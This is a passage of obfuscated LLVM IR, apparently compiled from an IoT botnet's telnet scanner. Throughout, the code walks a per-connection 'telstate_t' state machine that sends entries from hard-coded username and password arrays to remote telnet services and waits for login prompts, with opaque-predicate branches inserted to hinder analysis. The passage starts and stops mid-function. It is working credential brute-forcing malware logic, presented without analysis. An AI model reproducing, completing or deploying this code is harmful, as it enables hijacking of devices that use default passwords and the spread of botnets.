  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 6
  %536 = load i32, i32* %535, align 4
  %537 = add i32 %536, 5
  %538 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %539 = icmp ult i32 %537, %538
  %540 = load i32, i32* @x.63
  %541 = load i32, i32* @y.64
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart255, label %originalBB45alteredBB

originalBBpart255:                                ; preds = %originalBB45
  br i1 %539, label %548, label %579

; <label>:548:                                    ; preds = %originalBBpart255
  %549 = load i32, i32* @x.63
  %550 = load i32, i32* @y.64
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %548
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 0
  %561 = load i32, i32* %560, align 16
  %562 = call i32 @sclose(i32 %561)
  %563 = load i32, i32* %2, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 2
  store i8 0, i8* %566, align 8
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 3
  store i8 1, i8* %570, align 1
  %571 = load i32, i32* @x.63
  %572 = load i32, i32* @y.64
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %579

; <label>:579:                                    ; preds = %originalBBpart259, %originalBBpart255
  br label %1434

; <label>:580:                                    ; preds = %originalBBpart212
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 6
  %585 = load i32, i32* %584, align 4
  %586 = icmp eq i32 %585, 0
  br i1 %586, label %587, label %609

; <label>:587:                                    ; preds = %580
  %588 = load i32, i32* @x.63
  %589 = load i32, i32* @y.64
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %587
  %596 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %597 = load i32, i32* %2, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 6
  store i32 %596, i32* %600, align 4
  %601 = load i32, i32* @x.63
  %602 = load i32, i32* @y.64
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %609

; <label>:609:                                    ; preds = %originalBBpart263, %580
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 8
  %614 = load i8*, i8** %613, align 8
  %615 = call i32 @matchPrompt(i8* %614)
  %616 = icmp ne i32 %615, 0
  br i1 %616, label %617, label %622

; <label>:617:                                    ; preds = %609
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 2
  store i8 7, i8* %621, align 8
  br label %622

; <label>:622:                                    ; preds = %617, %609
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 0
  %627 = load i32, i32* %626, align 16
  %628 = load i32, i32* %2, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 8
  %632 = load i8*, i8** %631, align 8
  %633 = load i32, i32* %2, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 7
  %637 = load i16, i16* %636, align 16
  %638 = zext i16 %637 to i32
  %639 = call i32 @readUntil(i32 %627, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %632, i32 1024, i32 %638)
  %640 = icmp ne i32 %639, 0
  br i1 %640, label %641, label %659

; <label>:641:                                    ; preds = %622
  %642 = load i32, i32* %2, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 6
  store i32 0, i32* %645, align 4
  %646 = load i32, i32* %2, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 7
  store i16 0, i16* %649, align 16
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 8
  %654 = load i8*, i8** %653, align 8
  call void @llvm.memset.p0i8.i64(i8* %654, i8 0, i64 1024, i32 1, i1 false)
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 2
  store i8 3, i8* %658, align 8
  br label %1435

; <label>:659:                                    ; preds = %622
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 8
  %664 = load i8*, i8** %663, align 8
  %665 = call i64 @strlen(i8* %664) #10
  %666 = trunc i64 %665 to i16
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 7
  store i16 %666, i16* %670, align 16
  br label %671

; <label>:671:                                    ; preds = %659
  %672 = load i32, i32* %2, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 6
  %676 = load i32, i32* %675, align 4
  %677 = add i32 %676, 30
  %678 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %679 = icmp ult i32 %677, %678
  br i1 %679, label %680, label %711

; <label>:680:                                    ; preds = %671
  %681 = load i32, i32* @x.63
  %682 = load i32, i32* @y.64
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %680
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 0
  %693 = load i32, i32* %692, align 16
  %694 = call i32 @sclose(i32 %693)
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 2
  store i8 0, i8* %698, align 8
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 3
  store i8 1, i8* %702, align 1
  %703 = load i32, i32* @x.63
  %704 = load i32, i32* @y.64
  %705 = sub i32 %703, 1
  %706 = mul i32 %703, %705
  %707 = urem i32 %706, 2
  %708 = icmp eq i32 %707, 0
  %709 = icmp slt i32 %704, 10
  %710 = or i1 %708, %709
  br i1 %710, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %711

; <label>:711:                                    ; preds = %originalBBpart267, %671
  br label %1434

; <label>:712:                                    ; preds = %originalBBpart212
  %713 = load i32, i32* %2, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 0
  %717 = load i32, i32* %716, align 16
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 4
  %722 = load i8, i8* %721, align 2
  %723 = zext i8 %722 to i64
  %724 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %723
  %725 = load i8*, i8** %724, align 8
  %726 = load i32, i32* %2, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 4
  %730 = load i8, i8* %729, align 2
  %731 = zext i8 %730 to i64
  %732 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %731
  %733 = load i8*, i8** %732, align 8
  %734 = call i64 @strlen(i8* %733) #10
  %735 = call i64 @send(i32 %717, i8* %725, i64 %734, i32 16384)
  %736 = icmp slt i64 %735, 0
  br i1 %736, label %737, label %768

; <label>:737:                                    ; preds = %712
  %738 = load i32, i32* @x.63
  %739 = load i32, i32* @y.64
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %737
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = call i32 @sclose(i32 %750)
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 2
  store i8 0, i8* %755, align 8
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 3
  store i8 1, i8* %759, align 1
  %760 = load i32, i32* @x.63
  %761 = load i32, i32* @y.64
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %1435

; <label>:768:                                    ; preds = %712
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 0
  %773 = load i32, i32* %772, align 16
  %774 = call i64 @send(i32 %773, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.28, i32 0, i32 0), i64 2, i32 16384)
  %775 = icmp slt i64 %774, 0
  br i1 %775, label %776, label %807

; <label>:776:                                    ; preds = %768
  %777 = load i32, i32* @x.63
  %778 = load i32, i32* @y.64
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %776
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 16
  %790 = call i32 @sclose(i32 %789)
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 2
  store i8 0, i8* %794, align 8
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 3
  store i8 1, i8* %798, align 1
  %799 = load i32, i32* @x.63
  %800 = load i32, i32* @y.64
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %1435

; <label>:807:                                    ; preds = %768
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 2
  store i8 4, i8* %811, align 8
  br label %1434

; <label>:812:                                    ; preds = %originalBBpart212
  %813 = load i32, i32* %2, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 6
  %817 = load i32, i32* %816, align 4
  %818 = icmp eq i32 %817, 0
  br i1 %818, label %819, label %841

; <label>:819:                                    ; preds = %812
  %820 = load i32, i32* @x.63
  %821 = load i32, i32* @y.64
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %819
  %828 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %829 = load i32, i32* %2, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 6
  store i32 %828, i32* %832, align 4
  %833 = load i32, i32* @x.63
  %834 = load i32, i32* @y.64
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %841

; <label>:841:                                    ; preds = %originalBBpart279, %812
  %842 = load i32, i32* @x.63
  %843 = load i32, i32* @y.64
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %841
  %850 = load i32, i32* %2, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %851
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %852, i32 0, i32 0
  %854 = load i32, i32* %853, align 16
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 8
  %859 = load i8*, i8** %858, align 8
  %860 = load i32, i32* %2, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 7
  %864 = load i16, i16* %863, align 16
  %865 = zext i16 %864 to i32
  %866 = call i32 @readUntil(i32 %854, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %859, i32 1024, i32 %865)
  %867 = icmp ne i32 %866, 0
  %868 = load i32, i32* @x.63
  %869 = load i32, i32* @y.64
  %870 = sub i32 %868, 1
  %871 = mul i32 %868, %870
  %872 = urem i32 %871, 2
  %873 = icmp eq i32 %872, 0
  %874 = icmp slt i32 %869, 10
  %875 = or i1 %873, %874
  br i1 %875, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %867, label %876, label %940

; <label>:876:                                    ; preds = %originalBBpart283
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 6
  store i32 0, i32* %880, align 4
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 7
  store i16 0, i16* %884, align 16
  %885 = load i32, i32* %2, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 8
  %889 = load i8*, i8** %888, align 8
  %890 = call i8* @strstr(i8* %889, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %891 = icmp ne i8* %890, null
  br i1 %891, label %892, label %897

; <label>:892:                                    ; preds = %876
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 2
  store i8 5, i8* %896, align 8
  br label %918

; <label>:897:                                    ; preds = %876
  %898 = load i32, i32* @x.63
  %899 = load i32, i32* @y.64
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %897
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 2
  store i8 7, i8* %909, align 8
  %910 = load i32, i32* @x.63
  %911 = load i32, i32* @y.64
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %918

; <label>:918:                                    ; preds = %originalBBpart287, %892
  %919 = load i32, i32* @x.63
  %920 = load i32, i32* @y.64
  %921 = sub i32 %919, 1
  %922 = mul i32 %919, %921
  %923 = urem i32 %922, 2
  %924 = icmp eq i32 %923, 0
  %925 = icmp slt i32 %920, 10
  %926 = or i1 %924, %925
  br i1 %926, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %918
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 8
  %931 = load i8*, i8** %930, align 8
  call void @llvm.memset.p0i8.i64(i8* %931, i8 0, i64 1024, i32 1, i1 false)
  %932 = load i32, i32* @x.63
  %933 = load i32, i32* @y.64
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %1435

; <label>:940:                                    ; preds = %originalBBpart283
  %941 = load i32, i32* %2, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 8
  %945 = load i8*, i8** %944, align 8
  %946 = call i8* @strstr(i8* %945, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)) #10
  %947 = icmp ne i8* %946, null
  br i1 %947, label %948, label %963

; <label>:948:                                    ; preds = %940
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 0
  %953 = load i32, i32* %952, align 16
  %954 = call i32 @sclose(i32 %953)
  %955 = load i32, i32* %2, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %956
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %957, i32 0, i32 2
  store i8 0, i8* %958, align 8
  %959 = load i32, i32* %2, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 3
  store i8 0, i8* %962, align 1
  br label %1435

; <label>:963:                                    ; preds = %940
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 8
  %968 = load i8*, i8** %967, align 8
  %969 = call i64 @strlen(i8* %968) #10
  %970 = trunc i64 %969 to i16
  %971 = load i32, i32* %2, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 7
  store i16 %970, i16* %974, align 16
  br label %975

; <label>:975:                                    ; preds = %963
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 6
  %980 = load i32, i32* %979, align 4
  %981 = add i32 %980, 8
  %982 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %983 = icmp ult i32 %981, %982
  br i1 %983, label %984, label %1015

; <label>:984:                                    ; preds = %975
  %985 = load i32, i32* @x.63
  %986 = load i32, i32* @y.64
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %984
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %994
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %995, i32 0, i32 0
  %997 = load i32, i32* %996, align 16
  %998 = call i32 @sclose(i32 %997)
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 2
  store i8 0, i8* %1002, align 8
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 3
  store i8 1, i8* %1006, align 1
  %1007 = load i32, i32* @x.63
  %1008 = load i32, i32* @y.64
  %1009 = sub i32 %1007, 1
  %1010 = mul i32 %1007, %1009
  %1011 = urem i32 %1010, 2
  %1012 = icmp eq i32 %1011, 0
  %1013 = icmp slt i32 %1008, 10
  %1014 = or i1 %1012, %1013
  br i1 %1014, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %1015

; <label>:1015:                                   ; preds = %originalBBpart295, %975
  br label %1434

; <label>:1016:                                   ; preds = %originalBBpart212
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 16
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 5
  %1026 = load i8, i8* %1025, align 1
  %1027 = zext i8 %1026 to i64
  %1028 = getelementptr inbounds [16 x i8*], [16 x i8*]* @passwords, i64 0, i64 %1027
  %1029 = load i8*, i8** %1028, align 8
  %1030 = load i32, i32* %2, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 5
  %1034 = load i8, i8* %1033, align 1
  %1035 = zext i8 %1034 to i64
  %1036 = getelementptr inbounds [16 x i8*], [16 x i8*]* @passwords, i64 0, i64 %1035
  %1037 = load i8*, i8** %1036, align 8
  %1038 = call i64 @strlen(i8* %1037) #10
  %1039 = call i64 @send(i32 %1021, i8* %1029, i64 %1038, i32 16384)
  %1040 = icmp slt i64 %1039, 0
  br i1 %1040, label %1041, label %1072

; <label>:1041:                                   ; preds = %1016
  %1042 = load i32, i32* @x.63
  %1043 = load i32, i32* @y.64
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
